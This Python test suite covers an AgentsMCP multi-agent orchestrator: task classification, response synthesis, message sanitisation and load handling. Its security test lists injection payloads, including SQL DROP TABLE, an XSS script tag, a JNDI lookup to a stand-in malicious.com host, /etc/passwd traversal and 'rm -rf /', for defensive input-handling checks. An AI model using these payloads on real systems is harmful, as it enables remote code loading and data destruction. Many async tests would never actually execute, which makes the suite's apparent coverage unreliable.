#!/usr/bin/env python3
"""
Comprehensive QA Test Suite for AgentsMCP Agent Coordination System

This test suite validates the agent coordination system for real-world software 
development workflows including:
- Orchestrator communication patterns (User ↔ Orchestrator ↔ Agents)
- Task classification and intelligent agent selection
- Multi-agent collaboration workflows
- Error handling and system resilience
- Performance under realistic development loads

Tests focus on practical scenarios like requirements gathering, API design,
implementation coordination, and quality assurance workflows.
"""

import asyncio
import unittest
import logging
import time
from unittest.mock import Mock, patch, AsyncMock
from typing import Dict, List, Any

# Import system under test
from src.agentsmcp.orchestration.orchestrator import (
    Orchestrator, OrchestratorConfig, OrchestratorMode, OrchestratorResponse
)
from src.agentsmcp.orchestration.task_classifier import (
    TaskClassifier, TaskClassification, ClassificationResult
)
from src.agentsmcp.orchestration.response_synthesizer import (
    ResponseSynthesizer, SynthesisStrategy, SynthesisResult
)
from src.agentsmcp.orchestration.communication_interceptor import (
    CommunicationInterceptor, InterceptedResponse
)

class TestAgentCoordinationQA(unittest.TestCase):
    """Comprehensive QA tests for agent coordination system."""

    def setUp(self):
        """Set up test environment."""
        logging.basicConfig(level=logging.DEBUG)
        
        # Mock dependencies to avoid external calls during testing
        self.mock_conversation_manager = Mock()
        self.mock_agent_manager = Mock()
        
        # Create orchestrator with test configuration
        config = OrchestratorConfig(
            mode=OrchestratorMode.STRICT_ISOLATION,
            enable_smart_classification=True,
            max_agent_wait_time_ms=5000,  # Shorter timeout for tests
            fallback_to_simple_response=True
        )
        
        self.orchestrator = Orchestrator(
            config=config,
            conversation_manager=self.mock_conversation_manager,
            agent_manager=self.mock_agent_manager
        )
        
        # Create individual components for detailed testing
        self.task_classifier = TaskClassifier()
        self.response_synthesizer = ResponseSynthesizer()
        self.communication_interceptor = CommunicationInterceptor()

    def tearDown(self):
        """Clean up after tests."""
        # Ensure orchestrator is cleaned up
        if hasattr(self.orchestrator, 'shutdown'):
            asyncio.run(self.orchestrator.shutdown())

class TestOrchestratorCommunicationPattern(TestAgentCoordinationQA):
    """Test that orchestrator enforces proper communication isolation."""

    async def test_simple_greeting_no_agent_spawning(self):
        """Test that simple greetings don't unnecessarily spawn agents."""
        response = await self.orchestrator.process_user_input("hello")
        
        self.assertEqual(response.response_type, "simple")
        self.assertEqual(len(response.agents_consulted), 0)
        self.assertIn("Hello!", response.content)
        self.assertIn("AgentsMCP assistant", response.content)
        
        # Verify no agent calls were made
        self.mock_conversation_manager._delegate_to_mcp_agent_with_prompt.assert_not_called()

    async def test_status_request_shows_orchestrator_stats(self):
        """Test that status requests show orchestrator perspective, not agent details."""
        response = await self.orchestrator.process_user_input("status")
        
        self.assertEqual(response.response_type, "simple")
        self.assertIn("System status:", response.content)
        self.assertIn("Processed", response.content)
        self.assertIn("requests", response.content)
        
        # Should not show individual agent details
        self.assertNotIn("Agent", response.content)
        self.assertNotIn("MCP", response.content)

    async def test_agent_roster_request_consolidated_response(self):
        """Test that agent roster requests show unified capability overview."""
        response = await self.orchestrator.process_user_input("what agents do you have?")
        
        self.assertEqual(response.response_type, "simple")
        self.assertIn("specialized agents", response.content)
        self.assertIn("Architecture & Design", response.content)
        self.assertIn("Development", response.content)
        self.assertIn("Quality & Testing", response.content)
        
        # Should be from orchestrator perspective
        self.assertIn("I have access to", response.content)

    @patch.object(Orchestrator, '_call_agent_safely')
    async def test_single_agent_response_synthesis(self):
        """Test that single agent responses are properly synthesized."""
        # Mock agent response
        mock_agent_response = "🧩 Codex: I can help you implement that feature using Python."
        self.orchestrator._call_agent_safely.return_value = mock_agent_response
        
        response = await self.orchestrator.process_user_input("implement user authentication")
        
        self.assertEqual(response.response_type, "agent_delegated")
        self.assertEqual(len(response.agents_consulted), 1)
        self.assertIn("codex", response.agents_consulted[0])
        
        # Agent identifier should be removed from response
        self.assertNotIn("🧩", response.content)
        self.assertNotIn("Codex:", response.content)
        self.assertIn("implement", response.content.lower())

class TestTaskClassificationIntelligence(TestAgentCoordinationQA):
    """Test intelligent task classification for appropriate agent selection."""

    def test_simple_tasks_classification(self):
        """Test that simple tasks are correctly classified."""
        simple_inputs = [
            "hello",
            "hi there",
            "how are you",
            "status",
            "help",
            "what can you do"
        ]
        
        for user_input in simple_inputs:
            with self.subTest(input=user_input):
                result = self.task_classifier.classify(user_input)
                self.assertEqual(result.classification, TaskClassification.SIMPLE_RESPONSE)
                self.assertGreaterEqual(result.confidence, 0.7)
                self.assertEqual(len(result.required_agents), 0)

    def test_coding_tasks_classification(self):
        """Test that coding tasks are classified for appropriate agents."""
        coding_inputs = [
            "write a function to calculate fibonacci",
            "implement user authentication",
            "create a REST API for users",
            "debug this Python code",
            "optimize database queries",
            "refactor this module"
        ]
        
        for user_input in coding_inputs:
            with self.subTest(input=user_input):
                result = self.task_classifier.classify(user_input)
                self.assertEqual(result.classification, TaskClassification.SINGLE_AGENT_NEEDED)
                self.assertGreaterEqual(result.confidence, 0.6)
                self.assertGreater(len(result.required_agents), 0)
                self.assertIn(result.required_agents[0], ["codex", "claude", "ollama"])

    def test_multi_agent_tasks_classification(self):
        """Test that complex tasks requiring multiple agents are identified."""
        multi_agent_inputs = [
            "build a full stack web application with authentication and database",
            "create frontend and backend for user management system",
            "design and implement microservices architecture",
            "build React frontend with Node.js backend and MongoDB",
            "implement end-to-end user registration flow with testing"
        ]
        
        for user_input in multi_agent_inputs:
            with self.subTest(input=user_input):
                result = self.task_classifier.classify(user_input)
                self.assertIn(result.classification, [
                    TaskClassification.MULTI_AGENT_NEEDED,
                    TaskClassification.SINGLE_AGENT_NEEDED  # May vary based on complexity threshold
                ])
                self.assertGreaterEqual(result.confidence, 0.5)
                
                if result.classification == TaskClassification.MULTI_AGENT_NEEDED:
                    self.assertGreater(len(result.required_agents), 1)

    def test_classification_avoids_false_positives(self):
        """Test that complex-looking simple requests aren't over-classified."""
        edge_case_inputs = [
            "help me understand how authentication works",  # Explanation, not implementation
            "what is a REST API?",  # Question, not task
            "explain microservices architecture",  # Educational, not building
            "show me an example of Python function"  # Example request, not implementation
        ]
        
        for user_input in edge_case_inputs:
            with self.subTest(input=user_input):
                result = self.task_classifier.classify(user_input)
                # Should not require multi-agent coordination for educational requests
                self.assertNotEqual(result.classification, TaskClassification.MULTI_AGENT_NEEDED)

class TestMultiAgentCollaboration(TestAgentCoordinationQA):
    """Test multi-agent collaboration scenarios."""

    @patch.object(Orchestrator, '_call_agent_safely')
    async def test_multi_agent_response_synthesis(self):
        """Test that multiple agent responses are properly synthesized."""
        # Mock multiple agent responses
        agent_responses = {
            "codex": "I'll implement the backend API using FastAPI with proper authentication.",
            "claude": "For the frontend, I recommend using React with TypeScript for type safety.",
            "ollama": "Don't forget to add comprehensive tests for both components."
        }
        
        async def mock_agent_call(agent_type, prompt, context):
            return agent_responses.get(agent_type, f"Response from {agent_type}")
        
        self.orchestrator._call_agent_safely.side_effect = mock_agent_call
        
        response = await self.orchestrator.process_user_input(
            "build a full stack application with user authentication"
        )
        
        self.assertEqual(response.response_type, "multi_agent")
        self.assertGreater(len(response.agents_consulted), 1)
        
        # Response should be synthesized, not just concatenated
        self.assertIn("I can help", response.content.lower())
        # Should contain elements from multiple agents
        content_lower = response.content.lower()
        self.assertTrue(
            any(term in content_lower for term in ["api", "backend", "frontend", "react", "test"])
        )

    @patch.object(Orchestrator, '_call_agent_safely')
    async def test_agent_timeout_handling(self):
        """Test handling of agent timeouts in multi-agent scenarios."""
        # Mock one agent timing out
        async def mock_agent_call_with_timeout(agent_type, prompt, context):
            if agent_type == "slow_agent":
                await asyncio.sleep(10)  # Will timeout
                return "This should timeout"
            return f"Quick response from {agent_type}"
        
        self.orchestrator._call_agent_safely.side_effect = mock_agent_call_with_timeout
        
        # Reduce timeout for testing
        self.orchestrator.config.max_agent_wait_time_ms = 1000
        
        response = await self.orchestrator.process_user_input("complex task needing multiple agents")
        
        # Should still return a response despite timeout
        self.assertIsNotNone(response.content)
        self.assertGreater(len(response.content), 0)
        
        # Metadata should indicate some agents timed out
        if response.metadata:
            self.assertIn("timeout", str(response.metadata).lower())

class TestRealWorldDevelopmentScenarios(TestAgentCoordinationQA):
    """Test realistic software development workflow scenarios."""

    @patch.object(Orchestrator, '_call_agent_safely')
    async def test_requirements_gathering_workflow(self):
        """Test requirements gathering and analysis workflow."""
        # Mock business analyst response
        async def mock_ba_response(agent_type, prompt, context):
            if "business" in agent_type.lower() or "analyst" in agent_type.lower():
                return ("Based on the requirements, we need: 1) User registration/login, "
                       "2) Profile management, 3) Data validation, 4) Security measures")
            return "I can help implement the technical aspects."
        
        self.orchestrator._call_agent_safely.side_effect = mock_ba_response
        
        response = await self.orchestrator.process_user_input(
            "I need to build a user management system. Help me understand the requirements."
        )
        
        self.assertIsNotNone(response.content)
        self.assertIn("requirement", response.content.lower())
        self.assertTrue(len(response.content) > 50)  # Substantial response

    @patch.object(Orchestrator, '_call_agent_safely')
    async def test_api_design_and_implementation_workflow(self):
        """Test API design followed by implementation workflow."""
        # Mock API engineer and backend engineer responses
        async def mock_api_workflow(agent_type, prompt, context):
            if "api" in agent_type.lower():
                return ("API Design: POST /users, GET /users/{id}, PUT /users/{id}, "
                       "DELETE /users/{id}. Include proper error handling and validation.")
            elif "backend" in agent_type.lower():
                return ("Implementation using FastAPI with Pydantic models, SQLAlchemy ORM, "
                       "and PostgreSQL database. Include authentication middleware.")
            return "Supporting implementation details."
        
        self.orchestrator._call_agent_safely.side_effect = mock_api_workflow
        
        response = await self.orchestrator.process_user_input(
            "Design and implement a user management API"
        )
        
        self.assertIsNotNone(response.content)
        content_lower = response.content.lower()
        self.assertTrue(
            any(term in content_lower for term in ["api", "endpoint", "implementation", "database"])
        )

    @patch.object(Orchestrator, '_call_agent_safely')
    async def test_code_review_and_qa_workflow(self):
        """Test code review and QA coordination workflow."""
        async def mock_qa_workflow(agent_type, prompt, context):
            if "qa" in agent_type.lower():
                return ("Code review complete. Found: 1) Missing input validation, "
                       "2) No error handling for database failures, 3) Tests needed for edge cases.")
            return "Code looks good from my perspective."
        
        self.orchestrator._call_agent_safely.side_effect = mock_qa_workflow
        
        response = await self.orchestrator.process_user_input(
            "Review this user authentication code for quality and security issues"
        )
        
        self.assertIsNotNone(response.content)
        content_lower = response.content.lower()
        self.assertTrue(
            any(term in content_lower for term in ["review", "validation", "error", "test"])
        )

class TestResponseSynthesisQuality(TestAgentCoordinationQA):
    """Test response synthesis produces high-quality unified responses."""

    async def test_summarize_strategy_quality(self):
        """Test that summarize strategy produces coherent summaries."""
        agent_responses = {
            "agent1": "The implementation should use FastAPI for high performance REST APIs.",
            "agent2": "Database design needs proper indexing and relationships for scalability.", 
            "agent3": "Frontend should be responsive and accessible with React components."
        }
        
        result = await self.response_synthesizer.synthesize_responses(
            agent_responses, "build a web application", SynthesisStrategy.SUMMARIZE
        )
        
        self.assertIsInstance(result, SynthesisResult)
        self.assertGreater(len(result.synthesized_response), 20)
        self.assertGreater(result.confidence_score, 0.5)
        self.assertEqual(len(result.source_agents), 3)
        
        # Should contain key points from multiple agents
        response_lower = result.synthesized_response.lower()
        self.assertTrue(
            any(term in response_lower for term in ["api", "database", "frontend"])
        )

    async def test_collaborative_strategy_complementary_responses(self):
        """Test collaborative synthesis combines complementary responses effectively."""
        agent_responses = {
            "backend": "Here's the API implementation: ```python\ndef create_user(user_data): pass```",
            "frontend": "The user interface needs form validation and error handling.",
            "qa": "Add these test cases for edge cases and error conditions."
        }
        
        result = await self.response_synthesizer.synthesize_responses(
            agent_responses, "implement user creation", SynthesisStrategy.COLLABORATIVE
        )
        
        self.assertGreater(len(result.synthesized_response), 50)
        self.assertGreater(result.confidence_score, 0.7)
        
        # Should include implementation and guidance
        response_lower = result.synthesized_response.lower()
        self.assertTrue("implementation" in response_lower or "```" in result.synthesized_response)

    async def test_agent_identifier_removal(self):
        """Test that agent identifiers are properly removed from responses."""
        agent_responses = {
            "codex": "🧩 Codex: I can implement this using Python and FastAPI.",
            "claude": "Agent Claude: Here's my analysis of the requirements.",
            "ollama": "[Ollama Agent] I'll handle the local processing tasks."
        }
        
        result = await self.response_synthesizer.synthesize_responses(
            agent_responses, "help with implementation", SynthesisStrategy.SUMMARIZE
        )
        
        # Agent identifiers should be completely removed
        self.assertNotIn("🧩", result.synthesized_response)
        self.assertNotIn("Codex:", result.synthesized_response)
        self.assertNotIn("Agent Claude:", result.synthesized_response)
        self.assertNotIn("[Ollama Agent]", result.synthesized_response)

class TestCommunicationInterception(TestAgentCoordinationQA):
    """Test that communication interception works correctly."""

    def test_agent_response_sanitization(self):
        """Test that agent responses are properly sanitized."""
        agent_response = "🧩 Backend Agent: I can implement this API using FastAPI with proper authentication."
        
        result = self.communication_interceptor.intercept_response(
            "backend_agent", agent_response, {}
        )
        
        self.assertTrue(result.intercepted)
        sanitized = result.processed_response["sanitized_content"]
        
        # Agent identifiers should be removed
        self.assertNotIn("🧩", sanitized)
        self.assertNotIn("Backend Agent:", sanitized)
        
        # Content should be preserved
        self.assertIn("API", sanitized)
        self.assertIn("FastAPI", sanitized)
        self.assertIn("authentication", sanitized)

    def test_agent_status_message_interception(self):
        """Test that agent status messages are properly intercepted."""
        status_messages = [
            "Agent Backend starting up...",
            "Connecting to Claude API...",
            "Processing your request...",
            "Task assigned to Codex agent",
            "Analysis complete."
        ]
        
        for status in status_messages:
            with self.subTest(status=status):
                result = self.communication_interceptor.intercept_status_message(
                    "test_agent", status
                )
                
                # Most status messages should be suppressed or converted
                if result is not None:
                    # Converted messages should not contain agent references
                    self.assertNotIn("Agent", result)
                    self.assertNotIn("Claude", result)
                    self.assertNotIn("Codex", result)

    def test_response_blocking(self):
        """Test that inappropriate responses are completely blocked."""
        blocked_responses = [
            "Error in agent backend",
            "Agent codex failed to process",
            "MCP connection not available",
            "Task classification: COMPLEX_MULTI_AGENT"
        ]
        
        for response in blocked_responses:
            with self.subTest(response=response):
                result = self.communication_interceptor.intercept_response(
                    "test_agent", response, {}
                )
                
                self.assertTrue(result.intercepted)
                self.assertEqual(result.processed_response["sanitized_content"], "")
                self.assertIn("response_blocked", result.sanitization_applied)

class TestPerformanceAndReliability(TestAgentCoordinationQA):
    """Test system performance and reliability under load."""

    async def test_concurrent_request_handling(self):
        """Test that orchestrator can handle concurrent requests."""
        # Create multiple simple requests to test concurrency
        requests = [
            "hello",
            "status", 
            "what agents do you have",
            "help",
            "system info"
        ] * 3  # 15 total requests
        
        # Process all requests concurrently
        start_time = time.time()
        responses = await asyncio.gather(
            *[self.orchestrator.process_user_input(req) for req in requests]
        )
        end_time = time.time()
        
        # All requests should complete successfully
        self.assertEqual(len(responses), len(requests))
        for response in responses:
            self.assertIsInstance(response, OrchestratorResponse)
            self.assertGreater(len(response.content), 0)
        
        # Should complete in reasonable time (less than 5 seconds for simple requests)
        total_time = end_time - start_time
        self.assertLess(total_time, 5.0)
        
        print(f"Processed {len(requests)} concurrent requests in {total_time:.2f}s")

    async def test_error_recovery(self):
        """Test that system recovers gracefully from errors."""
        # Test with malformed input
        malformed_inputs = [
            "",  # Empty input
            " ",  # Whitespace only
            "a" * 10000,  # Very long input
            "🎯🧩🔧" * 100,  # Special characters
        ]
        
        for bad_input in malformed_inputs:
            with self.subTest(input=repr(bad_input[:50])):
                response = await self.orchestrator.process_user_input(bad_input)
                
                # Should still return a response, not crash
                self.assertIsInstance(response, OrchestratorResponse)
                self.assertGreater(len(response.content), 0)

    async def test_memory_and_resource_cleanup(self):
        """Test that system properly manages memory and resources."""
        # Process many requests to test for memory leaks
        for i in range(50):
            response = await self.orchestrator.process_user_input(f"test request {i}")
            self.assertIsNotNone(response)
        
        # Check that caches and temporary data don't grow unbounded
        orchestrator_stats = self.orchestrator.get_orchestrator_stats()
        self.assertLess(orchestrator_stats["cache_size"], 1000)  # Reasonable cache size
        
        # Test cleanup
        await self.orchestrator.shutdown()

class TestSecurityAndValidation(TestAgentCoordinationQA):
    """Test security aspects and input validation."""

    async def test_injection_attack_prevention(self):
        """Test that system prevents injection attacks through user input."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://malicious.com/evil}",
            "../../etc/passwd",
            "exec('rm -rf /')"
        ]
        
        for malicious_input in malicious_inputs:
            with self.subTest(input=malicious_input):
                response = await self.orchestrator.process_user_input(malicious_input)
                
                # System should handle malicious input gracefully
                self.assertIsInstance(response, OrchestratorResponse)
                
                # Response should not echo back the malicious content directly
                response_lower = response.content.lower()
                malicious_lower = malicious_input.lower()
                
                # Basic injection strings shouldn't appear in response
                dangerous_terms = ["drop table", "script", "jndi", "etc/passwd", "rm -rf"]
                for term in dangerous_terms:
                    if term in malicious_lower:
                        self.assertNotIn(term, response_lower)

    async def test_sensitive_information_filtering(self):
        """Test that system filters sensitive information from responses."""
        # This would be expanded with actual agent mocking in full implementation
        response = await self.orchestrator.process_user_input("show me system configuration")
        
        # Sensitive information should not be exposed
        sensitive_terms = ["password", "secret", "key", "token", "credential"]
        response_lower = response.content.lower()
        
        # Should not contain actual sensitive data (test with mock data)
        for term in sensitive_terms:
            if term in response_lower:
                # If term appears, it should be in generic context, not as actual values
                self.assertNotRegex(response_lower, rf"{term}[:\s=]+[a-zA-Z0-9{{}}]+")

def run_comprehensive_qa_tests():
    """Run all QA tests and generate report."""
    print("🔍 Starting Comprehensive Agent Coordination QA Tests")
    print("=" * 60)
    
    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Add all test classes
    test_classes = [
        TestOrchestratorCommunicationPattern,
        TestTaskClassificationIntelligence, 
        TestMultiAgentCollaboration,
        TestRealWorldDevelopmentScenarios,
        TestResponseSynthesisQuality,
        TestCommunicationInterception,
        TestPerformanceAndReliability,
        TestSecurityAndValidation
    ]
    
    for test_class in test_classes:
        tests = loader.loadTestsFromTestCase(test_class)
        suite.addTests(tests)
    
    # Run tests with detailed output
    runner = unittest.TextTestRunner(verbosity=2, stream=None, buffer=True)
    result = runner.run(suite)
    
    # Print summary
    print("\n" + "=" * 60)
    print("🎯 QA TEST RESULTS SUMMARY")
    print("=" * 60)
    print(f"Tests Run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Skipped: {len(result.skipped) if hasattr(result, 'skipped') else 0}")
    
    if result.failures:
        print(f"\n❌ FAILURES ({len(result.failures)}):")
        for test, traceback in result.failures:
            print(f"  - {test}: {traceback.split('AssertionError:')[-1].strip()}")
    
    if result.errors:
        print(f"\n🔥 ERRORS ({len(result.errors)}):")
        for test, traceback in result.errors:
            print(f"  - {test}: {traceback.split('Exception:')[-1].strip()}")
    
    success_rate = (result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100
    print(f"\n✅ Success Rate: {success_rate:.1f}%")
    
    if success_rate >= 90:
        print("🎉 EXCELLENT: Agent coordination system passes comprehensive QA!")
    elif success_rate >= 75:
        print("⚠️  GOOD: Minor issues found, but system is largely functional.")
    else:
        print("🚨 CRITICAL: Significant issues found. System needs attention before production.")
    
    return result.wasSuccessful()

if __name__ == "__main__":
    # Run the comprehensive QA test suite
    success = run_comprehensive_qa_tests()
    exit(0 if success else 1)